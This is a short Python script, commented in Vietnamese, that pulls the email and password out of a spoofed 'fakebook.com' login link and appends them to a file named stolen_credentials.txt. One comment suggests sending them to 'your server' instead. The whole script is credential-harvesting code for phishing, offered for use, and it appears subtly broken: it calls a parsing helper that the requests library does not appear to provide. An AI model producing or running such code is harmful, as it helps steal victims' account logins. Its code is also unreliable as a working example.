import requests

def extract_login_info_from_link(link):
    # Trích xuất thông tin đăng nhập từ link giả mạo
    login_info = requests.utils.urlparse(link)
    login_params = requests.utils.parse_qs(login_info.query)
    
    if 'email' in login_params and 'pass' in login_params:
        username = login_params['email'][0]
        password = login_params['pass'][0]
        
        # Lưu thông tin đăng nhập vào tệp hoặc gửi đến máy chủ của bạn
        with open('stolen_credentials.txt', 'a') as file:
            file.write(f'Username: {username}, Password: {password}\n')
        
        print("Đã lưu thông tin đăng nhập vào tệp stolen_credentials.txt.")
    else:
        print("Không tìm thấy thông tin đăng nhập trong link.")

# Sử dụng hàm extract_login_info_from_link với link giả mạo
link = 'https://fakebook.com/login.php?email=victim@example.com&pass=password123'
extract_login_info_from_link(link)
